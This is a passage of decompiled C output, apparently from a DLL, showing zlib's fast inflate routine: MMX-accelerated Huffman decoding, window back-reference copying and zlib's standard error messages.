         (uint)in_IF * 0x200 | (uint)in_TF * 0x100 | (uint)((uVar7 & 0x80) != 0) * 0x80 |
         (uint)in_AF * 0x10 | (uint)((uVar7 & 4) != 0) * 4 | (uint)((uVar7 & 1) != 0) |
         (uint)in_ID * 0x200000 | (uint)in_AC * 0x40000) == uVar24) {
LAB_1000c80f:
      DAT_10016000 = 3;
    }
    else {
      iVar6 = cpuid_basic_info(0);
      if (((*(int *)(iVar6 + 4) != 0x756e6547) || (*(int *)(iVar6 + 0xc) != 0x6c65746e)) ||
         (*(int *)(iVar6 + 8) != 0x49656e69)) goto LAB_1000c80f;
      puVar19 = (uint *)cpuid_Version_info(1);
      if (((*puVar19 >> 8 & 0xf) != 6) || ((puVar19[2] & 0x800000) == 0)) goto LAB_1000c80f;
      DAT_10016000 = 2;
    }
  }
  in_MM0 = (ulonglong)uVar18;
  in_MM1 = 0;
  uVar18 = uVar12;
LAB_1000ca5c:
  in_MM0 = in_MM0 >> in_MM1;
  if (uVar18 < 0x21) {
    uVar25 = (ulonglong)uVar18;
    uVar12 = *local_28;
    local_28 = local_28 + 1;
    uVar18 = uVar18 + 0x20;
    in_MM0 = in_MM0 | (ulonglong)uVar12 << uVar25;
  }
  uVar7 = *(uint *)(uVar2 + (uVar4 & (uint)in_MM0) * 4);
  while( true ) {
    uVar12 = uVar7 >> 8 & 0xff;
    in_MM1 = (ulonglong)uVar12;
    uVar18 = uVar18 - uVar12;
    if ((char)uVar7 == '\0') break;
    uVar24 = uVar7 >> 0x10;
    if ((uVar7 & 0x10) != 0) {
      uVar7 = uVar7 & 0xf;
      if (uVar7 != 0) {
        in_MM0 = in_MM0 >> in_MM1;
        in_MM1 = (ulonglong)uVar7;
        uVar18 = uVar18 - uVar7;
        uVar24 = uVar24 + ((uint)in_MM0 & *(uint *)(&DAT_1000c64c + uVar7 * 4));
      }
      in_MM0 = in_MM0 >> in_MM1;
      if (uVar18 < 0x21) {
        uVar25 = (ulonglong)uVar18;
        uVar12 = *local_28;
        local_28 = local_28 + 1;
        uVar18 = uVar18 + 0x20;
        in_MM0 = in_MM0 | (ulonglong)uVar12 << uVar25;
      }
      uVar7 = *(uint *)(iVar3 + (uVar5 & (uint)in_MM0) * 4);
      goto LAB_1000caf7;
    }
    uVar12 = uVar2;
    if ((uVar7 & 0x40) != 0) goto LAB_1000cc7a;
    in_MM0 = in_MM0 >> in_MM1;
    uVar7 = *(uint *)(uVar2 + (((uint)in_MM0 & *(uint *)(&DAT_1000c64c + (uVar7 & 0xf) * 4)) +
                              uVar24) * 4);
  }
  puVar22 = local_18 + (uint)bVar23 * -2 + 1;
  *local_18 = (char)(uVar7 >> 0x10);
  goto LAB_1000ca92;
LAB_1000caf7:
  uVar14 = uVar7 >> 8 & 0xff;
  uVar12 = uVar7 >> 0x10;
  uVar18 = uVar18 - uVar14;
  in_MM1 = (ulonglong)uVar14;
  if ((uVar7 & 0x10) != 0) goto code_r0x1000cb0c;
  if ((uVar7 & 0x40) != 0) goto LAB_1000cc6e;
  in_MM0 = in_MM0 >> in_MM1;
  uVar7 = *(uint *)(iVar3 + (((uint)in_MM0 & *(uint *)(&DAT_1000c64c + (uVar7 & 0xf) * 4)) + uVar12)
                            * 4);
  goto LAB_1000caf7;
code_r0x1000cb0c:
  uVar7 = uVar7 & 0xf;
  if (uVar7 == 0) {
    if ((uVar12 == 1) && (local_2c != local_18)) {
      uVar1 = local_18[-1];
      *local_18 = uVar1;
      local_18[1] = uVar1;
      local_18[2] = uVar1;
      puVar22 = local_18 + 3;
      for (iVar6 = uVar24 - 3; iVar6 != 0; iVar6 = iVar6 + -1) {
        *puVar22 = uVar1;
        puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
      }
      goto LAB_1000ca92;
    }
  }
  else {
    in_MM0 = in_MM0 >> in_MM1;
    in_MM1 = (ulonglong)uVar7;
    uVar18 = uVar18 - uVar7;
    uVar12 = uVar12 + ((uint)in_MM0 & *(uint *)(&DAT_1000c64c + uVar7 * 4));
  }
  if ((uint)((int)local_18 - (int)local_2c) < uVar12) {
    if (local_20 < uVar12) goto LAB_1000cc96;
    uVar7 = uVar12 - ((int)local_18 - (int)local_2c);
    if (local_24 == 0) {
      puVar20 = local_1c + (local_20 - uVar7);
      if (uVar7 < uVar24) {
        uVar24 = uVar24 - uVar7;
        puVar22 = local_1c + (local_20 - uVar7);
        for (; uVar7 != 0; uVar7 = uVar7 - 1) {
          *local_18 = *puVar22;
          puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
          local_18 = local_18 + (uint)bVar23 * -2 + 1;
        }
        puVar20 = local_18 + -uVar12;
      }
    }
    else if (local_24 < uVar7) {
      uVar14 = uVar7 - local_24;
      puVar20 = local_1c + ((local_24 + local_20) - uVar7);
      if (uVar14 < uVar24) {
        uVar24 = uVar24 - uVar14;
        puVar22 = local_1c + ((local_24 + local_20) - uVar7);
        for (; uVar14 != 0; uVar14 = uVar14 - 1) {
          *local_18 = *puVar22;
          puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
          local_18 = local_18 + (uint)bVar23 * -2 + 1;
        }
        puVar20 = local_1c;
        if (local_24 < uVar24) {
          uVar24 = uVar24 - local_24;
          puVar22 = local_1c;
          for (uVar7 = local_24; uVar7 != 0; uVar7 = uVar7 - 1) {
            *local_18 = *puVar22;
            puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
            local_18 = local_18 + (uint)bVar23 * -2 + 1;
          }
          puVar20 = local_18 + -uVar12;
        }
      }
    }
    else {
      puVar20 = local_1c + (local_24 - uVar7);
      if (uVar7 < uVar24) {
        uVar24 = uVar24 - uVar7;
        for (; uVar7 != 0; uVar7 = uVar7 - 1) {
          *local_18 = *puVar20;
          puVar20 = puVar20 + (uint)bVar23 * -2 + 1;
          local_18 = local_18 + (uint)bVar23 * -2 + 1;
        }
        puVar20 = local_18 + -uVar12;
      }
    }
    puVar22 = local_18;
    for (; uVar24 != 0; uVar24 = uVar24 - 1) {
      *puVar22 = *puVar20;
      puVar20 = puVar20 + (uint)bVar23 * -2 + 1;
      puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
    }
  }
  else {
    puVar22 = local_18 + -uVar12;
    *local_18 = *puVar22;
    uVar1 = puVar22[2];
    local_18[1] = puVar22[1];
    local_18[2] = uVar1;
    puVar20 = puVar22 + 3;
    puVar22 = local_18 + 3;
    for (iVar6 = uVar24 - 3; iVar6 != 0; iVar6 = iVar6 + -1) {
      *puVar22 = *puVar20;
      puVar20 = puVar20 + (uint)bVar23 * -2 + 1;
      puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
    }
  }
LAB_1000ca92:
  uVar12 = uVar2;
  if (puVar9 <= puVar22) goto LAB_1000ccb8;
  local_18 = puVar22;
  if (local_40 <= local_28) goto LAB_1000ccb8;
  goto LAB_1000ca5c;
code_r0x1000c8d2:
  bVar8 = (byte)uVar7 & 0xf;
  if ((uVar7 & 0xf) == 0) {
    if ((uVar14 != 1) || (local_2c == local_18)) goto LAB_1000c8fe;
    uVar1 = local_18[-1];
    *local_18 = uVar1;
    local_18[1] = uVar1;
    local_18[2] = uVar1;
    puVar22 = local_18 + 3;
    for (iVar6 = uVar24 - 3; iVar6 != 0; iVar6 = iVar6 + -1) {
      *puVar22 = uVar1;
      puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
    }
  }
  else {
    puVar19 = local_28;
    if (bVar16 < bVar8) {
      puVar19 = (uint *)((int)local_28 + (uint)bVar23 * -4 + 2);
      uVar12 = CONCAT31(uVar17,bVar16 + 0x10);
      uVar18 = uVar18 | (uint)(ushort)*local_28 << (bVar16 & 0x1f);
    }
    uVar12 = CONCAT31((int3)(uVar12 >> 8),(char)uVar12 - bVar8);
    uVar7 = (1 << bVar8) - 1U & uVar18;
    uVar18 = uVar18 >> bVar8;
    uVar14 = uVar14 + uVar7;
    local_28 = puVar19;
LAB_1000c8fe:
    if ((uint)((int)local_18 - (int)local_2c) < uVar14) {
      if (local_20 < uVar14) {
LAB_1000cc96:
        pcVar13 = "invalid distance too far back";
        uVar15 = 0x1a;
        puVar22 = local_18;
        goto LAB_1000cca6;
      }
      uVar7 = uVar14 - ((int)local_18 - (int)local_2c);
      if (local_24 == 0) {
        puVar20 = local_1c + (local_20 - uVar7);
        if (uVar7 < uVar24) {
          uVar24 = uVar24 - uVar7;
          puVar22 = local_1c + (local_20 - uVar7);
          for (; uVar7 != 0; uVar7 = uVar7 - 1) {
            *local_18 = *puVar22;
            puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
            local_18 = local_18 + (uint)bVar23 * -2 + 1;
          }
          puVar20 = local_18 + -uVar14;
        }
      }
      else if (local_24 < uVar7) {
        uVar11 = uVar7 - local_24;
        puVar20 = local_1c + ((local_24 + local_20) - uVar7);
        if (uVar11 < uVar24) {
          uVar24 = uVar24 - uVar11;
          puVar22 = local_1c + ((local_24 + local_20) - uVar7);
          for (; uVar11 != 0; uVar11 = uVar11 - 1) {
            *local_18 = *puVar22;
            puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
            local_18 = local_18 + (uint)bVar23 * -2 + 1;
          }
          puVar20 = local_1c;
          if (local_24 < uVar24) {
            uVar24 = uVar24 - local_24;
            puVar22 = local_1c;
            for (uVar7 = local_24; uVar7 != 0; uVar7 = uVar7 - 1) {
              *local_18 = *puVar22;
              puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
              local_18 = local_18 + (uint)bVar23 * -2 + 1;
            }
            puVar20 = local_18 + -uVar14;
          }
        }
      }
      else {
        puVar20 = local_1c + (local_24 - uVar7);
        if (uVar7 < uVar24) {
          uVar24 = uVar24 - uVar7;
          for (; uVar7 != 0; uVar7 = uVar7 - 1) {
            *local_18 = *puVar20;
            puVar20 = puVar20 + (uint)bVar23 * -2 + 1;
            local_18 = local_18 + (uint)bVar23 * -2 + 1;
          }
          puVar20 = local_18 + -uVar14;
        }
      }
      puVar22 = local_18;
      for (; uVar24 != 0; uVar24 = uVar24 - 1) {
        *puVar22 = *puVar20;
        puVar20 = puVar20 + (uint)bVar23 * -2 + 1;
        puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
      }
    }
    else {
      puVar22 = local_18 + -uVar14;
      *local_18 = *puVar22;
      uVar1 = puVar22[2];
      local_18[1] = puVar22[1];
      local_18[2] = uVar1;
      puVar20 = puVar22 + 3;
      puVar22 = local_18 + 3;
      for (iVar6 = uVar24 - 3; iVar6 != 0; iVar6 = iVar6 + -1) {
        *puVar22 = *puVar20;
        puVar20 = puVar20 + (uint)bVar23 * -2 + 1;
        puVar22 = puVar22 + (uint)bVar23 * -2 + 1;
      }
    }
  }
  while ((puVar22 < puVar9 && (local_18 = puVar22, local_28 < local_40))) {
LAB_1000c820:
    bVar8 = (byte)uVar12;
    if (bVar8 < 0x10) {
      uVar12 = CONCAT31((int3)(uVar12 >> 8),bVar8 + 0x10);
      uVar18 = uVar18 | (uint)(ushort)*local_28 << (bVar8 & 0x1f);
      local_28 = (uint *)((int)local_28 + (uint)bVar23 * -4 + 2);
    }
    uVar7 = *(uint *)(uVar2 + (uVar4 & uVar18) * 4);
    while( true ) {
      bVar8 = (byte)(uVar7 >> 8);
      uVar17 = (undefined3)(uVar12 >> 8);
      bVar16 = (char)uVar12 - bVar8;
      uVar12 = CONCAT31(uVar17,bVar16);
      uVar18 = uVar18 >> (bVar8 & 0x1f);
      bVar8 = (byte)uVar7;
      if (bVar8 == 0) break;
      uVar24 = uVar7 >> 0x10;
      if ((uVar7 & 0x10) != 0) {
        bVar8 = bVar8 & 0xf;
        puVar19 = local_28;
        if ((uVar7 & 0xf) != 0) {
          if (bVar16 < bVar8) {
            puVar19 = (uint *)((int)local_28 + (uint)bVar23 * -4 + 2);
            uVar12 = CONCAT31(uVar17,bVar16 + 0x10);
            uVar18 = uVar18 | (uint)(ushort)*local_28 << (bVar16 & 0x1f);
          }
          uVar12 = CONCAT31((int3)(uVar12 >> 8),(char)uVar12 - bVar8);
          uVar7 = (1 << bVar8) - 1U & uVar18;
          uVar18 = uVar18 >> bVar8;
          uVar24 = uVar24 + uVar7;
        }
        bVar8 = (byte)uVar12;
        local_28 = puVar19;
        if (bVar8 < 0x10) {
          local_28 = (uint *)((int)puVar19 + (uint)bVar23 * -4 + 2);
          uVar12 = CONCAT31((int3)(uVar12 >> 8),bVar8 + 0x10);
          uVar18 = uVar18 | (uint)(ushort)*puVar19 << (bVar8 & 0x1f);
        }
        uVar7 = *(uint *)(iVar3 + (uVar5 & uVar18) * 4);
        goto LAB_1000c8bd;
      }
      if ((uVar7 & 0x40) != 0) goto LAB_1000cc7a;
      uVar7 = *(uint *)(uVar2 + (((1 << (bVar8 & 0x1f)) - 1U & uVar18) + uVar24) * 4);
    }
    puVar22 = local_18 + (uint)bVar23 * -2 + 1;
    *local_18 = (char)(uVar7 >> 0x10);
  }
  goto LAB_1000ccb8;
LAB_1000c8bd:
  uVar14 = uVar7 >> 0x10;
  bVar8 = (byte)(uVar7 >> 8);
  uVar17 = (undefined3)(uVar12 >> 8);
  bVar16 = (char)uVar12 - bVar8;
  uVar12 = CONCAT31(uVar17,bVar16);
  uVar18 = uVar18 >> (bVar8 & 0x1f);
  if ((uVar7 & 0x10) != 0) goto code_r0x1000c8d2;
  if ((uVar7 & 0x40) != 0) goto LAB_1000cc6e;
  uVar7 = *(uint *)(iVar3 + (((1 << ((byte)uVar7 & 0x1f)) - 1U & uVar18) + uVar14) * 4);
  goto LAB_1000c8bd;
LAB_1000cc6e:
  pcVar13 = "invalid distance code";
  uVar15 = 0x1a;
  puVar22 = local_18;
  goto LAB_1000cca6;
LAB_1000cc7a:
  puVar22 = local_18;
  if ((uVar7 & 0x20) == 0) {
    pcVar13 = "invalid literal/length code";
    uVar15 = 0x1a;
  }
  else {
    pcVar13 = (char *)0x0;
    uVar15 = 0xb;
  }
LAB_1000cca6:
  if (pcVar13 != (char *)0x0) {
    param_1[6] = (int)pcVar13;
  }
  *(undefined4 *)param_1[7] = uVar15;
LAB_1000ccb8:
  if (DAT_10016000 == 2) {
    uVar12 = uVar18;
  }
  iVar6 = param_1[7];
  local_28 = (uint *)((int)local_28 - (uVar12 >> 3));
  iVar10 = uVar12 + (uVar12 >> 3) * -8;
  param_1[3] = (int)puVar22;
  *(int *)(iVar6 + 0x3c) = iVar10;
  if (local_40 == local_38) {
    local_28 = (uint *)((int)local_28 + (*param_1 - (int)local_38));
    local_40 = (uint *)(*param_1 + param_1[1] + -0xb);
  }
  *param_1 = (int)local_28;
  if (DAT_10016000 == 2) {
    uVar18 = (uint)(in_MM0 >> in_MM1);
  }
  *(uint *)(iVar6 + 0x38) = uVar18 & (1 << ((byte)iVar10 & 0x1f)) - 1U;
  if (local_28 < local_40) {
    param_1[1] = (int)((int)local_40 + (0xb - (int)local_28));
  }
  else {
    param_1[1] = 0xb - ((int)local_28 - (int)local_40);
  }
  if (puVar22 < puVar9) {
    param_1[4] = (int)(puVar9 + (0x101 - (int)puVar22));
  }
  else {
    param_1[4] = 0x101 - ((int)puVar22 - (int)puVar9);
  }
  return;
}


